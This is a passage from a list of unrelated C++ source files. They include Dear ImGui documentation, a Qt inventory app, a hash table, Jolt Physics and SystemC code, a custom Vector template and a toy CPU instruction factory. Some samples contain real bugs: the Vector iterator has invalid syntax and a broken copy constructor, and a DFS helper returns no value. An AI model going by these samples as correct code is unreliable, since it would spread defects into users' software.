IMGUI\n  - GETTING STARTED WITH INTEGRATING DEAR IMGUI IN YOUR CODE/ENGINE\n  - HOW A SIMPLE APPLICATION MAY LOOK LIKE (2 variations)\n  - HOW A SIMPLE RENDERING FUNCTION MAY LOOK LIKE\n  - USING GAMEPAD/KEYBOARD NAVIGATION CONTROLS\n- API BREAKING CHANGES (read me when you update!)\n- FREQUENTLY ASKED QUESTIONS (FAQ)\n  - Read all answers online: https://www.dearimgui.org/faq, or in docs/FAQ.md (with a Markdown viewer)\n\nCODE\n(search for \"[SECTION]\" in the code to find them)\n\n// [SECTION] FORWARD DECLARATIONS\n// [SECTION] CONTEXT AND MEMORY ALLOCATORS\n// [SECTION] MAIN USER FACING STRUCTURES (ImGuiStyle, ImGuiIO)\n// [SECTION] MISC HELPERS/UTILITIES (Geometry functions)\n// [SECTION] MISC HELPERS/UTILITIES (String, Format, Hash functions)\n// [SECTION] MISC HELPERS/UTILITIES (File functions)\n// [SECTION] MISC HELPERS/UTILITIES (ImText* functions)\n// [SECTION] MISC HELPERS/UTILITIES (color functions)\n// [SECTION] ImGuiStorage\n// [SECTION] ImGuiTextFilter\n// [SECTION] ImGuiTextBuffer\n// [SECTION] ImGuiListClipper\n// [SECTION] RENDER HELPERS\n// [SECTION] MAIN CODE (most of the code! lots of stuff, needs tidying up!)\n// [SECTION] ERROR CHECKING\n// [SECTION] SCROLLING\n// [SECTION] TOOLTIPS\n// [SECTION] POPUPS\n// [SECTION] KEYBOARD/GAMEPAD NAVIGATION\n// [SECTION] DRAG AND DROP\n// [SECTION] LOGGING/CAPTURING\n// [SECTION] SETTINGS\n// [SECTION] PLATFORM DEPENDENT HELPERS\n// [SECTION] METRICS/DEBUG WINDOW\n\n*/\n\n//-----------------------------------------------------------------------------\n// DOCUMENTATION\n//-----------------------------------------------------------------------------\n\n/*\n\n MISSION STATEMENT\n =================\n\n - Easy to use to create code-driven and data-driven tools.\n - Easy to use to create ad hoc short-lived tools and long-lived, more elaborate tools.\n - Easy to hack and improve.\n - Minimize screen real-estate usage.\n - Minimize setup and maintenance.\n - Minimize state storage on user side.\n - Portable, minimize dependencies, run on target (consoles, phones, etc.).\n - Efficient runtime and memory consumption (NB- we do allocate when \"growing\" content e.g. creating a window,.\n   opening a tree node for the first time, etc. but a typical frame should not allocate anything).\n\n Designed for developers and content-creators, not the typical end-user! Some of the weaknesses includes:\n - Doesn't look fancy, doesn't animate.\n - Limited layout features, intricate layouts are typically crafted in code.\n\n\n END-USER GUIDE\n ==============\n\n - Double-click on title bar to collapse window.\n - Click upper right corner to close a window, available when 'bool* p_open' is passed to ImGui::Begin().\n - Click and drag on lower right corner to resize window (double-click to auto fit window to its contents).\n - Click and drag on any empty space to move window.\n - TAB/SHIFT+TAB to cycle through keyboard editable fields.\n - CTRL+Click on a slider or drag box to input value as text.\n - Use mouse wheel to scroll.\n - Text editor:\n   - Hold SHIFT or use mouse to select text.\n   - CTRL+Left/Right to word jump.\n   - CTRL+Shift+Left/Right to select words.\n   - CTRL+A our Double-Click to select all.\n   - CTRL+X,CTRL+C,CTRL+V to use OS clipboard/\n   - CTRL+Z,CTRL+Y to undo/redo.\n   - ESCAPE to revert text to its original value.\n   - You can apply a",
    "#include \"cframe.h\"\n#include \"ui_cframe.h\"\n#include \"ProductoConStock.h\"\n#include \"ProductoConDescuento.h\"\n#include <QMessageBox>\n#include <QInputDialog>\n#include <QLineEdit>\n#include <QDebug>\n\ncframe::cframe(QWidget *parent)\n    : QMainWindow(parent)\n    , ui(new Ui::cframe)\n{\n    ui->setupUi(this);\n}\n\ncframe::~cframe()\n{\n    delete ui;\n}\n\n\n//FUNCIONES\nvoid cframe::agregarProducto() {\n    QString nombreProducto = ui->LE_Nombre_3->text();\n    double precio = ui->spb_Precio_3->value();\n    QString descripcion = ui->TE_Descripcion_3->toPlainText();\n    int adicional = ui->spb_Adicional_3->value();\n\n    int tipoProducto = ui->comboBox_Tipo_3->currentIndex();\n    std::unique_ptr<Producto> producto;\n\n    if (tipoProducto == 0) {\n        if (adicional > 100) {\n            QMessageBox::warning(this, \"Advertencia\", \"El descuento no puede ser mayor al 100%\");\n            return;\n        }\n        if (adicional > 0) {\n            producto = std::make_unique<ProductoConDescuento>(nombreProducto.toStdString(), precio, descripcion.toStdString(), adicional);\n        } else {\n            QMessageBox::warning(this, \"Advertencia\", \"Para ProductoConDescuento el descuento debe ser mayor a 0.\");\n            return;\n        }\n    } else if (tipoProducto == 1) {\n        producto = std::make_unique<ProductoConStock>(nombreProducto.toStdString(), precio, descripcion.toStdString(), adicional);\n    } else {\n        QMessageBox::warning(this, \"Advertencia\", \"Tipo de producto no v\u00e1lido.\");\n        return;\n    }\n\n    if (producto) {\n        inventario.agregarProducto(std::move(producto));\n        QMessageBox::information(this, \"\u00c9xito\", \"El producto se ha agregado exitosamente al inventario.\");\n        size_t tamano = inventario.obtenerTamanioInventario();\n        qDebug() << \"El tama\u00f1o del inventario es:\" << tamano;\n    }\n}\nvoid cframe::eliminarProducto() {\n    QString nombreProducto = ui->LE_NombreEliminar_3->text();\n\n    if (!nombreProducto.isEmpty()) {\n        bool eliminado = inventario.eliminarProducto(nombreProducto.toStdString());\n\n        if (eliminado) {\n            QMessageBox::information(this, \"Producto Eliminado\", \"El producto ha sido eliminado exitosamente.\");\n        } else {\n            QMessageBox::warning(this, \"Error\", \"No se encontr\u00f3 el producto para eliminar.\");\n        }\n    } else {\n        QMessageBox::warning(this, \"Advertencia\", \"Por favor, ingrese el nombre del producto a eliminar.\");\n    }\n}\n\nvoid cframe::mostrarProducto()\n{\n    inventario.mostrarInventario(ui->TE_ProductosLista_3);\n}\n\nvoid cframe::mostrarValorTotalInventario()\n{\n    double valorTotal = inventario.calcularValorInventario();\n\n    QMessageBox::information(this, \"Valor Total del Inventario\", \"Valor Total del Inventario: \" + QString::number(valorTotal));\n}\n\n\n//IMPLEMENTACI\u00d3N FUNCIONES A BOTONES\nvoid cframe::on_pushButton_2_clicked()\n{\n    agregarProducto();\n}\n\nvoid cframe::on_pushButton_3_clicked()\n{\n    eliminarProducto();\n}\n\nvoid cframe::on_page1_clicked()\n{\n    ui->stackedWidget->setCurrentIndex(1);\n\n}\n\n\nvoid cframe::on_page2_clicked()\n{\n    ui->stackedWidget->setCurrentIndex(3);\n    mostrarProducto();\n}\n\n\nvoid cframe::on_page3_clicked()\n{\n    ui->stackedWidget->setCurrentIndex(2);\n}\n\n\nvoid cframe::on_btn_close_released()\n{\n     QCoreApplication::quit();\n}\n\n\nvoid cframe::on_btn_back_clicked()\n{\n    ui->stackedWidget->setCurrentIndex(0);\n}\n\nvoid cframe::on_btn_back2_clicked()\n{\n    ui->stackedWidget->setCurrentIndex(0);\n}\n\n\nvoid cframe::on_btn_back3_clicked()\n{\n    ui->stackedWidget->setCurrentIndex(0);\n}\n\n\nvoid cframe::on_btn_total_invent_clicked()\n{\n    mostrarValorTotalInventario();\n}\n\n// finishted\n\n",
    "#include <iostream>\n#include <string>\n\n#define HT_SIZE 13\n#define HT_BASE 31\nusing namespace std;\n\ntypedef unsigned long long ull;\n\nclass Data {\nprivate:\n  int key;\n  string value;\npublic:\n  Data() : key(0), value(\"\") {}\n  Data(int key, string value) : key(key), value(value) {}\n  int getKey() { return key; }\n  string getValue() { return value; }\n  void print() { cout << \"key: \" << key << \", value: \" << value << endl; }\n};\n\ntemplate <typename T> class Node {\npublic:\n  Data data;\n  Node<T> *next;\n  Node() : next(nullptr) {}\n};\n\ntemplate <typename T> class List {\nprivate:\n  Node<T> *first;\n  Node<T> *last;\n  int size;\n  Node<T> *getNodeByPos(int pos) {\n    Node<T> *ptr = first->next;\n    for (int i = 0; i < pos; ++i) {\n      ptr = ptr->next;\n    }\n    return ptr;\n  }\n  Node<T> *predecessor(Node<T> *target) {\n    Node<T> *ptr = first;\n    while (ptr->next != target && ptr != nullptr) {\n      ptr = ptr->next;\n    }\n    return ptr;\n  }\n  void removeNode(Node<T> *target) {\n    Node<T> *ptr = predecessor(target);\n    ptr->next = target->next;\n    if (ptr->next == nullptr)\n      last = ptr;\n    delete target;\n    target = nullptr;\n  }\n\npublic:\n  List() {\n    first = new Node<T>();\n    first->next = nullptr;\n    last = first;\n    size = 0;\n  }\n  int getSize() { return size; }\n  bool isEmpty() { return size == 0; }\n  void insert(Data data) {\n    last->next = new Node<T>();\n    last = last->next;\n    last->next = nullptr;\n    last->data = data;\n    ++size;\n  }\n  void show() {\n    Node<T> *ptr = first->next;\n    while (ptr != nullptr) {\n      ptr->data.print();\n      ptr = ptr->next;\n    }\n    if (size == 0)\n      cout << \"(NULL)\" << endl;\n    else\n      cout << \"size: \" << size << endl;\n  }\n  Data getItemByPos(int pos) {\n    if (!isEmpty()) {\n      Node<T> *ptr = first->next;\n      for (int i = 0; i < pos; ++i) {\n        ptr = ptr->next;\n      }\n      return ptr->data;\n    } else\n      return first->data;\n  }\n  void removeItemByPos(int pos) {\n    if (!isEmpty()) {\n      Node<T> *target = getNodeByPos(pos);\n      if (target != nullptr)\n        removeNode(target);\n      --size;\n    }\n  }\n  T getItemByValue(string value) {\n    Node<T> *ptr = first->next;\n    T data = ptr->data;\n    if (!isEmpty()) {\n      while (ptr != nullptr) {\n        if (ptr->data.getValue() == value)\n          return ptr->data;\n        else\n          ptr = ptr->next;\n      }\n      return data;\n    } else\n      return data;\n  }\n  void removeItemByValue(string value) {\n    Node<T> *ptr = first->next;\n    if (!isEmpty()) {\n      while (ptr != nullptr) {\n        if (ptr->data.getValue() == value) {\n          removeNode(ptr);\n          break;\n        } else\n          ptr = ptr->next;\n      }\n    } else\n      cout << \"list is empty\" << endl;\n  }\n};\n\ntemplate<typename T> class HashTable {\nprivate:\n  List<T> array[HT_SIZE];\n  ull fastExp(ull base, ull expoent, ull mod)\n    {\n        ull ans = 1;\n        while (expoent) {\n            if (expoent & 1)\n                ans = ((ans % mod) * (base % mod)) % mod;\n            base = ((base % mod) * (base % mod)) % mod;\n            expoent >>= 1;\n        }\n        return ans % mod;\n    }\n    ull hash(std::string value)\n    {\n        ull hash = 0;\n        ull keySize = value.size();\n        for (ull i = 0; i < keySize; i++)\n            hash = (hash + value[i] * (fastExp(HT_BASE, keySize - i - 1, HT_SIZE))) % HT_SIZE;\n        return hash % HT_SIZE;\n    }\npublic:\n  HashTable() {}\n  void insert(Data *data) {\n    int index = hash(data->getValue());\n    array[index].insert(*data);\n  }\n\n  Data getDataByKey(string key) {\n    int index = hash(key);\n    return array[index].getItemByValue(key);\n  }\n\n  Data popDataByKey(string key) {\n    int index = hash(key);\n    Data data = array[index].getItemByValue(key);\n    array[index].removeItemByValue(key);\n    return data;\n  }\n\n  void show() {\n    cout << \"[==== HASH TABLE ====]\" << endl;\n    for (int i = 0; i < HT_SIZE; ++i) {\n      cout << i << \"| \";\n      array[i].show();\n    }\n    cout << \"[=====================]\" << endl;\n  }\n};\n\nint main() {\n  HashTable<Data> ht;\n  string str1 = \"Hash\";\n  string str2 = \"pedro\";\n  string str3 = \"Isabela\";\n  string str4 = \"Jose\";\n  string str5 = \"Maria\";\n  Data *data1 = new Data(1, str1);\n  Data *data2 = new Data(2, str2);\n  Data *data3 = new Data(3, str3);\n  Data *data4 = new Data(4, str4);\n  Data *data5 = new Data(5, str5);\n  ht.insert(data1);\n  ht.insert(data2);\n  ht.insert(data3);\n  ht.insert(data4);\n  ht.insert(data5);\n  ht.show();\n\n  Data mydata = ht.getDataByKey(str3);\n  cout << \"my silly data: \";\n  mydata.print();\n\n  Data popedData = ht.popDataByKey(str3);\n  cout << \"my silly poped data: \";\n  popedData.print();\n  ht.show();\n  return 0;\n}",
    "#include <algorithm>\n#include <assert.h>\n\n#include <iostream>\n\n#include \"vbkioctree_node.h\"\n\nnamespace vsemantic_bki {\n\n    /// Default static values\n    int Semantics::num_class = 2;\n    float Semantics::sf2 = 1.0f;\n    float Semantics::ell = 1.0f;\n    float Semantics::prior = 0.5f;\n    float Semantics::var_thresh = 1000.0f;\n    float Semantics::free_thresh = 0.3f;\n    float Semantics::occupied_thresh = 0.7f;\n\n    void Semantics::get_probs(std::vector<float>& probs) const {\n      assert (probs.size() == num_class);\n      float sum = 0;\n      for (auto m : ms)\n        sum += m;\n      for (int i = 0; i < num_class; ++i)\n        probs[i] = ms[i] / sum;\n    }\n\n    void Semantics::get_vars(std::vector<float>& vars) const {\n      assert (vars.size() == num_class);\n      float sum = 0;\n      for (auto m : ms){\n        sum += m;\n      }\n      for (int i = 0; i < num_class; ++i){\n        vars[i] = ((ms[i] / sum) - (ms[i] / sum) * (ms[i] / sum)) / (sum + 1);\n      }\n    }\n    void Semantics::get_dempster_vars(std::vector<float>& vars) const {\n      assert (vars.size() == num_class);\n      float sum = 0;\n      for (auto m : ms){\n        sum += m;\n      }\n      for (int i = 0; i < num_class; ++i){\n        vars[i] = 1.0 - sum;\n      }\n    }\n\n    void Semantics::update(std::vector<float>& ybars) {\n      assert(ybars.size() == num_class);\n      classified = true;\n      for (int i = 0; i < num_class; ++i)\n        ms[i] += ybars[i];\n\n      std::vector<float> probs(num_class);\n      get_probs(probs);\n\n      semantics = std::distance(probs.begin(), std::max_element(probs.begin(), probs.end()));\n\n      // if (semantics == 12 || (semantics == 0 && ms[0] < 1.01))\n      if (semantics == 0)\n        state = State::FREE;\n      else\n        state = State::OCCUPIED;\n    }\n\n    void Semantics::update(std::vector<float>& ybars, double uncertainty, int data_number) {\n      if(edl_unc_weight == 0){\n        edl_unc_avg = uncertainty;\n        edl_unc_weight = data_number;\n      }else{\n        edl_unc_avg = ((double) edl_unc_weight * edl_unc_avg + (double) data_number * uncertainty) / (double) (edl_unc_weight + data_number);\n        edl_unc_weight += data_number;\n      }\n\n      update(ybars);\n    }\n\n    void Semantics::update_direct(std::vector<float>& ybars, double uncertainty, int data_number) {\n      assert(ybars.size() == num_class);\n      classified = true;\n\n      dempster_combination(ybars, ms, 1);\n      std::vector<float> probs(num_class);\n      get_probs(probs);\n\n      semantics = std::distance(probs.begin(), std::max_element(probs.begin(), probs.end()));\n\n      if (semantics == 0)\n        state = State::FREE;\n      else\n        state = State::OCCUPIED;\n    }\n}\n",
    "#include <bits/stdc++.h>\n#include <iostream>\n#include <vector>\n#include <string>\n#include <map>\n\nusing namespace std;\n\n/*\n\n2. Number of Provinces\n\n3. Time Complexity:\n\t5. O(V+E) where V is the number of vertices and E is the number of edges in the graph.\n\n3. Space Complexity:\n\t5. O(V) where V is the number of vertices in the graph.\n\n3. Description:\n\t5. Given a graph, we have to find the number of provinces.\n\t5. A province is a group of connected nodes.\n\t5. Two nodes are connected if there is an edge between them.\n\n3. Approach:\n\t5. We will use DFS to solve this problem.\n\t5. We will traverse the graph.\n\t5. If we find a node that is not visited, we will increment the count of provinces and call the solve function.\n\t5. In the solve function, we will mark the current node as visited.\n\t5. We will traverse the adjacent nodes of the current node.\n\t5. If the adjacent node is not visited, we will call the solve function recursively.\n\t5. We will return the count of provinces.\n\n*/\n\nint solve(vector<int> adj[], vector<int> &vis, int node)\n{\n\tvis[node] = 1;\n\n\tfor (auto it : adj[node])\n\t{\n\t\tif (vis[it] == 0)\n\t\t{\n\t\t\tsolve(adj, vis, it);\n\t\t}\n\t}\n}\n\nint numOfProvinces(vector<int> adj[], int V)\n{\n\tint count = 0;\n\tvector<int> vis(V + 1, 0);\n\n\tfor (int i = 0; i < V; i++)\n\t{\n\t\tif (!vis[i])\n\t\t{\n\t\t\tcount++;\n\t\t\tsolve(adj, vis, i);\n\t\t}\n\t}\n\n\treturn count;\n}\n\nint main()\n{\n\n\treturn 0;\n}",
    "// Jolt Physics Library (https://github.com/jrouwe/JoltPhysics)\n// SPDX-FileCopyrightText: 2021 Jorrit Rouwe\n// SPDX-License-Identifier: MIT\n\n#include <Jolt/Jolt.h>\n\n#include <Jolt/Physics/Collision/Shape/RotatedTranslatedShape.h>\n#include <Jolt/Physics/Collision/CollisionDispatch.h>\n#include <Jolt/Physics/Collision/RayCast.h>\n#include <Jolt/Physics/Collision/ShapeCast.h>\n#include <Jolt/Physics/Collision/TransformedShape.h>\n#include <Jolt/Core/StreamIn.h>\n#include <Jolt/Core/StreamOut.h>\n#include <Jolt/ObjectStream/TypeDeclarations.h>\n\nJPH_NAMESPACE_BEGIN\n\nJPH_IMPLEMENT_SERIALIZABLE_VIRTUAL(RotatedTranslatedShapeSettings)\n{\n\tJPH_ADD_BASE_CLASS(RotatedTranslatedShapeSettings, DecoratedShapeSettings)\n\n\tJPH_ADD_ATTRIBUTE(RotatedTranslatedShapeSettings, mPosition)\n\tJPH_ADD_ATTRIBUTE(RotatedTranslatedShapeSettings, mRotation)\n}\n\nShapeSettings::ShapeResult RotatedTranslatedShapeSettings::Create() const\n{\n\tif (mCachedResult.IsEmpty())\n\t\tRef<Shape> shape = new RotatedTranslatedShape(*this, mCachedResult);\n\treturn mCachedResult;\n}\n\nRotatedTranslatedShape::RotatedTranslatedShape(const RotatedTranslatedShapeSettings &inSettings, ShapeResult &outResult) :\n\tDecoratedShape(EShapeSubType::RotatedTranslated, inSettings, outResult)\n{\n\tif (outResult.HasError())\n\t\treturn;\n\n\t// Calculate center of mass position\n\tmCenterOfMass = inSettings.mPosition + inSettings.mRotation * mInnerShape->GetCenterOfMass();\n\n\t// Store rotation (position is always zero because we center around the center of mass)\n\tmRotation = inSettings.mRotation;\n\tmIsRotationIdentity = mRotation.IsClose(Quat::sIdentity());\n\n\toutResult.Set(this);\n}\n\nRotatedTranslatedShape::RotatedTranslatedShape(Vec3Arg inPosition, QuatArg inRotation, const Shape *inShape) :\n\tDecoratedShape(EShapeSubType::RotatedTranslated, inShape)\n{\n\t// Calculate center of mass position\n\tmCenterOfMass = inPosition + inRotation * mInnerShape->GetCenterOfMass();\n\n\t// Store rotation (position is always zero because we center around the center of mass)\n\tmRotation = inRotation;\n\tmIsRotationIdentity = mRotation.IsClose(Quat::sIdentity());\n}\n\nMassProperties RotatedTranslatedShape::GetMassProperties() const\n{\n\t// Rotate inertia of child into place\n\tMassProperties p = mInnerShape->GetMassProperties();\n\tp.Rotate(Mat44::sRotation(mRotation));\n\treturn p;\n}\n\nAABox RotatedTranslatedShape::GetLocalBounds() const\n{\n\treturn mInnerShape->GetLocalBounds().Transformed(Mat44::sRotation(mRotation));\n}\n\nAABox RotatedTranslatedShape::GetWorldSpaceBounds(Mat44Arg inCenterOfMassTransform, Vec3Arg inScale) const\n{\n\tMat44 transform = inCenterOfMassTransform * Mat44::sRotation(mRotation);\n\treturn mInnerShape->GetWorldSpaceBounds(transform, TransformScale(inScale));\n}\n\nTransformedShape RotatedTranslatedShape::GetSubShapeTransformedShape(const SubShapeID &inSubShapeID, Vec3Arg inPositionCOM, QuatArg inRotation, Vec3Arg inScale, SubShapeID &outRemainder) const\n{\n\t// We don't use any bits in the sub shape ID\n\toutRemainder = inSubShapeID;\n\n\tTransformedShape ts(RVec3(inPositionCOM), inRotation * mRotation, mInnerShape, BodyID());\n\tts.SetShapeScale(TransformScale(inScale));\n\treturn ts;\n}\n\nVec3 RotatedTranslatedShape::GetSurfaceNormal(const SubShapeID &inSubShapeID, Vec3Arg inLocalSurfacePosition) const\n{\n\t// Transform surface position to local space and pass call on\n\tMat44 transform = Mat44::sRotation(mRotation.Conjugated());\n\tVec3 normal = mInnerShape->GetSurfaceNormal(inSubShapeID, transform * inLocalSurfacePosition);\n\n\t// Transform normal to this shape's space\n\treturn transform.Multiply3x3Transposed(normal);\n}\n\nvoid RotatedTranslatedShape::GetSupportingFace(const SubShapeID &inSubShapeID, Vec3Arg inDirection, Vec3Arg inScale, Mat44Arg inCenterOfMassTransform, SupportingFace &outVertices) const\n{\n\tMat44 transform = Mat44::sRotation(mRotation);\n\tmInnerShape->GetSupportingFace(inSubShapeID, transform.Multiply3x3Transposed(inDirection), TransformScale(inScale), inCenterOfMassTransform * transform, outVertices);\n}\n\nvoid RotatedTranslatedShape::GetSubmergedVolume(Mat44Arg inCenterOfMassTransform, Vec3Arg inScale, const Plane &inSurface, float &outTotalVolume, float &outSubmergedVolume, Vec3 &outCenterOfBuoyancy JPH_IF_DEBUG_RENDERER(, RVec3Arg inBaseOffset)) const\n{\n\t// Get center of mass transform of child\n\tMat44 transform = inCenterOfMassTransform * Mat44::sRotation(mRotation);\n\n\t// Recurse to child\n\tmInnerShape->GetSubmergedVolume(transform, TransformScale(inScale), inSurface, outTotalVolume, outSubmergedVolume, outCenterOfBuoyancy JPH_IF_DEBUG_RENDERER(, inBaseOffset));\n}\n\n#ifdef JPH_DEBUG_RENDERER\nvoid RotatedTranslatedShape::Draw(DebugRenderer *inRenderer, RMat44Arg inCenterOfMassTransform, Vec3Arg inScale, ColorArg inColor, bool inUseMaterialColors, bool inDrawWireframe) const\n{\n\tmInnerShape->Draw(inRenderer, inCenterOfMassTransform * Mat44::sRotation(mRotation), TransformScale(inScale), inColor, inUseMaterialColors, inDrawWireframe);\n}\n\nvoid RotatedTranslatedShape::DrawGetSupportFunction(DebugRenderer *inRenderer, RMat44Arg i",
    "/*****************************************************************************\n\n  Licensed to Accellera Systems Initiative Inc. (Accellera) under one or\n  more contributor license agreements.  See the NOTICE file distributed\n  with this work for additional information regarding copyright ownership.\n  Accellera licenses this file to you under the Apache License, Version 2.0\n  (the \"License\"); you may not use this file except in compliance with the\n  License.  You may obtain a copy of the License at\n\n    http://www.apache.org/licenses/LICENSE-2.0\n\n  Unless required by applicable law or agreed to in writing, software\n  distributed under the License is distributed on an \"AS IS\" BASIS,\n  WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or\n  implied.  See the License for the specific language governing\n  permissions and limitations under the License.\n\n *****************************************************************************/\n\n/*****************************************************************************\n\n  std_ulogic_tilda.cpp -- \n\n  Original Author: Martin Janssen, Synopsys, Inc., 2002-02-15\n\n *****************************************************************************/\n\n/*****************************************************************************\n\n  MODIFICATION LOG - modifiers, enter your name, affiliation, date and\n  changes you are making here.\n\n      Name, Affiliation, Date:\n  Description of Modification:\n\n *****************************************************************************/\n\n#include \"systemc.h\"\n\nint sc_main(int ac, char *av[])\n{\n\n  sc_logic  value1 = SC_LOGIC_1;//'1';\n  sc_logic  value0 = SC_LOGIC_0;//'0';\n\n  sc_logic\ta;  \n  sc_logic\tb;  \n  sc_logic\tc;  \n  sc_logic\td;  \n  sc_logic  e;\n\n  a = !value1.to_bool();\t\t\n  b = !value0.to_bool();\n  c = ~value1;\n  d = ~value0;\n  e = ~sc_logic('1');\n\n  cout << \"\\n a = \" << a << \" (!1)\"\n       << \"\\n b = \" << b << \" (!0)\"\n       << \"\\n c = \" << c << \" (~1)\"\n       << \"\\n d = \" << d << \" (~0)\"\n       << \"\\n e = \" << e << \" (~1)\"\n       << endl;\n  return 0;\n} \n",
    "#include <algorithm>\n#include <cstddef>\n#include <initializer_list>\n#include <iostream>\n#include <memory>\n#include <stdexcept>\n#include <type_traits>\n#include <cassert>\n\ntemplate <typename T> class Vector {\n    using value_type = T;\n    using reference = value_type&;\n    using const_reference = const value_type&;\n\n    using pointer = value_type*;\n    using const_pointer = const pointer;\n\n    using size_type = std::size_t;\n    using difference_type = std::ptrdiff_t;\n\n    size_type capacity_{};\n    size_type size_{};\n\n    pointer data_ = nullptr;\n\n    template <bool is_const>\n    class base_iterator {\n    public:\n        using pointer_type = typename std::conditional_t<is_const, const_pointer, pointer>;\n        using reference_type = typename std::conditional_t<is_const, const_reference, reference>;\n\n        pointer_type ptr_ = nullptr;\n        pointer_type begin_ = nullptr;\n        pointer_type end_ = nullptr;\n\n        base_iterator() : ptr_(nullptr), begin_(nullptr), end_(nullptr) {}\n\n        base_iterator(pointer_type ptr, pointer_type begin, pointer_type end)\n            : ptr_(ptr), begin_(begin), end_(end) {}\n        base_iterator(const base_iterator& other) : begin_(other.begin_), ptr_(other.begin_), end_(other.end_) {}\n\n        base_iterator& operator=(const base_iterator& other)const {\n            begin_ = other.begin_;\n            ptr_ = other.ptr_;\n            end_ = other.end_;\n        }\n\n        reference_type operator*() const {\n            check_range();\n            return *ptr_;\n        }\n        pointer_type operator->() const {\n            check_range();\n            return ptr_;\n        }\n\n        base_iterator& operator++() {\n            ++ptr_;\n            check_range();\n            return *this;\n        }\n\n        base_iterator& operator--() {\n            --ptr_;\n            check_range();\n            return *this;\n        }\n\n        base_iterator operator++(int) {\n            base_iterator copy<false> = *this;\n            ++ptr_;\n            check_range();\n            return copy;\n        }\n\n        base_iterator operator--(int) {\n            base_iterator<false> copy = *this;\n            --ptr_;\n            check_range();\n            return copy;\n        }\n\n        base_iterator operator+(const difference_type value) const {\n            base_iterator<false> temp = *this;\n            temp.ptr_ += value;\n            temp.check_range();\n            return temp;\n        }\n\n        base_iterator operator-(const difference_type value) const {\n            base_iterator<false> temp = *this;\n            temp.ptr_ -= value;\n            temp.check_range();\n            return temp;\n        }\n\n        difference_type operator-(const base_iterator& other) const {\n            return ptr_ - other.ptr_;\n        }\n\n        base_iterator& operator+=(const difference_type value) {\n            ptr_ += value;\n            check_range();\n            return *this;\n        }\n\n        base_iterator& operator-=(const difference_type n) {\n            ptr_ -= n;\n            check_range();\n            return *this;\n        }\n\n        bool operator==(const base_iterator& other) const {\n            return ptr_ == other.ptr_;\n        }\n\n        bool operator!=(const base_iterator& other) const {\n            return ptr_ != other.ptr_;\n        }\n\n        bool operator<(const base_iterator& other) const {\n            return ptr_ < other.ptr_;\n        }\n\n        bool operator<=(const base_iterator& other) const {\n            return ptr_ <= other.ptr_;\n        }\n\n        bool operator>(const base_iterator& other) const {\n            return ptr_ > other.ptr_;\n        }\n\n        bool operator>=(const base_iterator& other) const {\n            return ptr_ >= other.ptr_;\n        }\n\n        operator base_iterator<true>() const {\n            return { ptr_, begin_, end_ };\n        }\n\n        operator base_iterator<false>() const {\n            return { ptr_, begin_, end_ };\n        }\n\n        void check_range() const {\n            if (ptr_ < begin_ || ptr_ > end_) {\n                throw std::out_of_range(\"Iterator out of range\");\n            }\n        }\n    };\n\n    void preparation_for_exit()\n    {\n        clear();\n        delete[] reinterpret_cast<char*>(data_);\n    }\n\npublic:\n    using iterator = base_iterator<false>;\n    using const_iterator = base_iterator<true>;\n\n    using reverse_iterator = std::reverse_iterator<iterator>;\n    using const_reverse_iterator = std::reverse_iterator<const_iterator>;\n\n    Vector() : capacity_(0), size_(0), data_(nullptr) {}\n\n    Vector(size_type n) : capacity_(n), size_(n), data_(reinterpret_cast<pointer>(::new char[n * sizeof(value_type)])) {\n        std::uninitialized_default_construct_n(data_, n);\n    }\n\n    Vector(size_type n, const_reference value)\n        : capacity_(n), size_(n), data_(reinterpret_cast<pointer>(::new char[n * sizeof(value_type)])) {\n        std::uninitialized_fill_n(data_, n, value);\n    }\n\n    Vector(const std::initializer_list<T>& list)\n        : capacity_(list.size()), si",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"flutter_cubit_sample\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "#include \"InstructionFactory.h\"\n#include \"../include/instructions/AddInstruction.h\"\n#include \"../include/instructions/SetInstruction.h\"\n#include \"../include/instructions/AddiInstruction.h\"\n#include \"../include/instructions/ExitInstruction.h\"\n#include \"../include/instructions/JMPInstruction.h\"\n#include \"../include/instructions/PrintInstruction.h\"\n\n\nInstructionFactory::InstructionFactory(CPU& cpu): cpu(cpu) {\n}\n\nstd::unique_ptr<Instruction> InstructionFactory::createInstruction(const std::string& instructionCode) {\n    std::string opcode = instructionCode.substr(0, instructionCode.find(' '));\n    std::string operands = instructionCode.substr(instructionCode.find(' ') + 1);\n\n    if (opcode == \"ADD\") {\n        return std::make_unique<AddInstruction>(cpu, operands);\n    } else if (opcode == \"ADDI\") {\n        return std::make_unique<AddiInstruction>(cpu, operands);\n    } else if (opcode == \"SET\") {\n        return std::make_unique<SetInstruction>(cpu, operands);\n    } else if (opcode == \"EXIT\") {\n        return std::make_unique<ExitInstruction>(cpu, operands);\n    } else if (opcode == \"JMP\") {\n        return std::make_unique<JmpInstruction>(cpu, operands);\n    } else if (opcode == \"PRINT\") {\n        return std::make_unique<PrintInstruction>(cpu, operands);\n    } else {\n        return nullptr;\n    }\n}\n",
